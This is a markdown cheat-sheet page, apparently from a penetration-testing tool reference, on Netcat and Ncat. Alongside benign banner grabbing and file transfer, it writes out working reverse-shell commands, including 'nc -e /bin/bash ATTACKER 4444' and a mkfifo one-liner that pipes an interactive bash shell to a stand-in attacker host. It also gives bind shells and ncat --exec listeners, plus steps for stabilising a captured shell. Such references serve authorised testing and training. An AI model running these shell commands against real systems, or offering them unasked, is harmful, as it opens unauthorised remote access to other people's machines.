---
name: Netcat (nc) / Ncat
category: Connection & Pivoting
description: Read, write and redirect raw TCP/UDP connections; banner grabbing and reverse shells.
tags: [netcat, ncat, shell, reverse, banner, transfer]
---

# Netcat (nc) / Ncat

**Netcat** reads and writes data across TCP/UDP connections. Use it for banner grabbing, file transfer, bind/reverse shells and as a building block for any network task. **Ncat** (from the Nmap project) is the modern version, with SSL, proxy and access control.

> `nc` (varies: traditional/OpenBSD) · `apt install ncat` for `ncat` · [nmap.org/ncat](https://nmap.org/ncat)

## Connect & banner grabbing

```bash
nc target 80                        # connect to port 80
nc -v target 22                     # verbose; shows the SSH banner
printf "HEAD / HTTP/1.0\r\n\r\n" | nc target 80
nc -zv target 20-25                 # -z: just test ports (mini scan)
nc -u target 53                     # UDP
```

## Listener (server)

```bash
nc -lvnp 4444                       # listen on 4444 (l listen, v verbose, n no-DNS, p port)
ncat -lvnp 4444 --ssl               # TLS listener (ncat)
```

## File transfer

```bash
# Receiver:
nc -lvnp 4444 > received.bin
# Sender:
nc target 4444 < file.bin

# Whole folder via tar
nc -lvnp 4444 | tar xzvf -                 # receiver
tar czf - folder/ | nc target 4444         # sender
```

## Reverse shell (the target connects back)

```bash
# On the attacker (listener):
nc -lvnp 4444

# On the target:
nc -e /bin/bash ATTACKER 4444              # if nc supports -e
# Without -e (more portable):
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER 4444 > /tmp/f
```

## Bind shell (the target opens the port)

```bash
# On the target:
nc -lvnp 4444 -e /bin/bash
# On the attacker:
nc TARGET 4444
```

## Stabilize a shell (TTY)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then on the host: stty raw -echo; fg
export TERM=xterm
```

## Ncat: extra features

```bash
ncat --ssl -lvnp 4444                        # TLS listener
ncat --exec "/bin/bash" -lvnp 4444           # equivalent to -e
ncat --allow 10.0.0.5 -lvnp 4444             # only accept that IP
ncat --proxy 127.0.0.1:9050 --proxy-type socks5 target 80
```

> `-e` is missing from many `nc` builds (for safety) — hence the **mkfifo** trick. Reverse shells only on systems you're allowed to access. For sturdier tunnels see [socat](#/tool/socat) and [chisel](#/tool/chisel).
